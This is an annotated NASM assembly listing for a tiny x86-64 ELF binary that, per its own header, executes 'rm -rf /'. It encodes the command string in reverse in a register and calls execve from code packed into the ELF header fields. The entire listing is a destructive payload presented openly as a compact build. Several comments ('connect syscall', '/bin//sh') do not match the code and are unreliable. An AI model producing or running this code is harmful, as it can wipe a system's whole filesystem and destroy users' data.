; rm -rf / in 93 bytes.
BITS 64
  org 0x100000000
;---------------------+------+-------------+------------------------------------------+
; Code Listing        | OFFS |  ASSEMBLY   | CODE COMMENT                             |
;---------------------+------+-------------+------------------------------------------+
  db 0x7F, "ELF"      ; 0x0  |    7f454c46 | Elf Magic Value
_start:               ;      |             |
  mov rbx, 0x2f2066722d206d72   ; | rm -rf / in reverse
  jmp short woop      ; 0x0E |       eb 3c | Then onto the rest of our code 
  dw 2                ; 0x10 |       02 00 | e_type              
  dw 0x3e             ; 0x12 |       3e 00 | e_machine           
  dd 1                ; 0x14 | 01 00 00 00 | e_version           
  dd _start - $$      ; 0x18 | 04 00 00 00 | e_entry             
phdr:                 ;      |             |-- Begin Program Header
  dd 1                ; 0x1C | 01 00 00 00 |                    [PHDR] p_type
  dd phdr - $$        ; 0x20 | 1C 00 00 00 | [EHDR] e_phoff     [PHDR] p_flags  
  dd 0                ; 0x24 | 00 00 00 00 |                    [PHDR] p_offset
  dd 0                ; 0x28 | 00 00 00 00 | [EHDR] e_shoff     
  dq $$               ; 0x2C | 00 00 00 00 |                    [PHDR] p_vaddr
                      ; 0x30 | 01 00 00 00 | [EHDR] e_flags
  dw 0x40             ; 0x34 |       40 00 | [EHDR] e_ehsize    [PHDR] p_addr 
  dw 0x38             ; 0x36 |       38 00 | [EHDR] e_phentsize 
  dw 1                ; 0x38 |       01 00 | [EHDR] e_phnum
  dw 2                ; 0x3A |       02 00 | [EHDR] e_shentsize 
execy:                ;      |             |-- Begin execve syscall
  add al, 0x3b        ; 0x3C |        043b | execve syscall
  syscall             ; 0x3E |        0f05 | Call kernel
  dd 0                ; 0x40 |             | [PHDR] p_filesz
  add al, 0x3b        ; 0x44 |        043b | execve syscall
  syscall             ; 0x46 |        0f05 | Call kernel
  dd 0                ; 0x48 | 00 00 00 00 | [PHDR] p_memsz
woop:                 ;      |             |-- Begin connect syscall
  ;--- execve -------------------------------------------------------------------------
  xor rax, rax                  ;               4831c0 | make 0 3
  push rbx                      ;                   53 | push this string to the stack
  mov rdi, rsp                  ;               4889e7 | move pointer to the string to rdi
  push rax                      ;                   50 | push a 0 
  mov rdx, rsp                  ;               4889e2 | push pointer to 0 to rdx
  push rdi                      ;                   57 | push /bin//sh string to stack
  mov rsi, rsp                  ;               4889e6 | move pointer to it to rsi
  jmp short execy               ;                 eb8d | Back up into program headers
  
